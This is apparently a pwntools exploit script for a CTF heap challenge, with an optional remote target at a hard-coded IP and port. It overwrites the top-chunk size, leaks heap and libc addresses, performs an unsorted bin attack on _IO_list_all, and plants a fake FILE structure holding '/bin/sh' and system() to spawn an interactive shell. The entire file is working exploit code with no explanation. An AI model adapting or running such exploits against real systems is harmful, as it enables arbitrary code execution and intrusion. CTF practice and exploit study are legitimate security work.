# -*- coding:UTF-8 -*-
from pwn import *

context.log_level = 'debug'

context.arch = 'amd64'
SigreturnFrame(kernel = 'amd64')
context.terminal = ["/usr/bin/tmux","sp","-h"]

binary = "./pwn"

local = 1
if local:
    p = process(binary)
    elf = ELF(binary)
    #libc = ELF('./libc.so.6')
    libc = ELF("/glibc/2.23/64/lib/libc.so.6")
else:
    p = remote("47.108.195.119","20141")
    libc = ELF('./libc.so.6')

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
rl = lambda :p.recvline()
sa = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
u64Leakbase = lambda offset :u64(ru("\x7f")[-6: ] + '\0\0') - offset
u32Leakbase = lambda offset :u32(ru("\xf7")[-4: ]) - offset
it      = lambda                    :p.interactive()

menu = "Your choice : "

def first():
    p.sendline('Venom')
    p.sendline('Venom')

def dockerDbg():
 myGdb = remote("127.0.0.1",30001)
 myGdb.close()
 pause()

def dbg():
 gdb.attach(p)
 pause()


def lg(string,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(string,addr))

def add(size, con):
 sla(menu, "1")
 sla("size of it\n", str(size))
 sa("Name?", con)

def edit(size, con):
 sla(menu, "2")
 sla("size of it\n", str(size))
 sa("name\n", con)

def show():
 sla(menu, "3")

#first()
ru('0x')
heap_base = int(rc(12),16) - 0x10
lg("heap_base",heap_base)

#change top_chunk size
add(0x28,'PIG007NB')
edit(0x30,'PIG007NB'*(0x28/8)+p64(0x0fb1))

#set top_chunk into unsortedbin
add(0xff8,'PIG007NB')

add(0x48,'PIG007NB')
#dbg()
show()
libc_base = u64Leakbase(0x10 + 1640 + libc.sym['__malloc_hook'])
#global_max_fast = libc_base + libc.sym['global_max_fast']
main_arena_addr = libc_base + libc.sym['__malloc_hook'] + 0x10
_IO_list_all_addr = libc_base + libc.sym['_IO_list_all']
system_addr = libc_base + libc.sym['system']
#lg("global_max_fast",global_max_fast)
lg("libc_base",libc_base)
lg("main_arena_addr",main_arena_addr)
lg("_IO_list_all_addr",_IO_list_all_addr)
lg("system_addr",system_addr)
dbg()
#set into 0x60 smallBin
fake_IO_all_list = '/bin/sh\x00'.ljust(8,'\x00')+p64(0x60)

#unsorted bin attack
fake_IO_all_list += p64(0)+p64(_IO_list_all_addr-0x10)

#IO_write_ptr>IO_write_base
fake_IO_all_list += p64(0)+p64(1)

#mode=0
fake_IO_all_list = fake_IO_all_list.ljust(0xc0,'\x00')

payload = 'PIG007NB'*(0x40/8)
payload += fake_IO_all_list
payload += p64(0)*3+p64(heap_base + 0x178)
payload += 'PIG007NB'*(0x10/8)
payload += p64(system_addr)

#dbg()
edit(len(payload),payload)
ru(": ")
sl('1')
it()
